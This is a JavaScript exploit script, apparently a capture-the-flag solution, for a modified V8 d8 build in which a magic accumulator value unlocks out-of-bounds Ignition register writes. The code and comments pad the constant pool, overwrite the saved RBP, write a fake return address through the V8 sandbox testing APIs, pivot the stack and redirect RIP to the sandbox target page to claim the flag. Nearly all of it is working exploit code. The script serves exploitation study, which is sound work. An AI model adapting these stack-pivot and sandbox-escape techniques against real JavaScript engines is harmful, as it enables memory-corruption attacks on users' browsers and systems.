/**
 * @mebeim - 2024-09-11
 */

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
let newStackAddr;

/* Need to have 1337.1337 in the accumulator while a LdaConstant with constant
 * index = 18 is invoked. The LdaConstant will see the marker value and allow
 * arbitrary Ignition register write using the constant index as register index.
 * The register index is not bound checked so accessing arguments that don't
 * exist (higher index than the number of arguments passed to the function)
 * allows arbitrary write on the v8 stack. Writing at register 18 will overwrite
 * the saved RBP (18 works with this specific function, it can vary depending on
 * the function code and also the way d8 is invoked).
 *
 * We cannot insert 1337.1337 directly as a constant because of the check
 * implemented in BytecodeArrayBuilder::GetConstantPoolEntry(), but we can
 * calculate it in the function to get it in the accumulator.
 *
 * We extract the address of the constant that will overwrite RBP (a HeapNumber)
 * so that we can manipulate its content later to get RIP control and jump
 * inside the Sandbox testing target page.
 */
function f(x) {
	// These pad the constant pool to have the marker at the desired index.
	// Depending on function code and on how d8 is invoked, more or less padding
	// may be needed. YMMV. Note that global var names are also constants that
	// will appear in the constant pool.
	g0 = 111.111;
	g1 = 222.222;
	g2 = 333.333;
	g3 = 444.444;
	g4 = 555.555;
	g5 = 666.666;
	g6 = 777.777;
	g7 = 888.888;

	let marker   = 1336.1337 + x; // Load marker in accumulator (if x === 1)
	let newStack = 69.420;        // This HeapNumber will overwrite saved RBP

	// Save HeapNumber addr: we'll write a fake return addr there later
	newStackAddr = Sandbox.getAddressOf(newStack);
}

// Get addr of constant pool object (newStack)
f(0);

console.log('[+] Stack pivot constant @ cage + 0x' + newStackAddr.toString(16));

// Pivot stack inside cage and point RIP to target page (PROT_NONE) to trigger a
// sandbox violation and get the flag
mem.setBigUint64(newStackAddr + 9, BigInt(Sandbox.targetPage), true);

// GG WP
f(1);
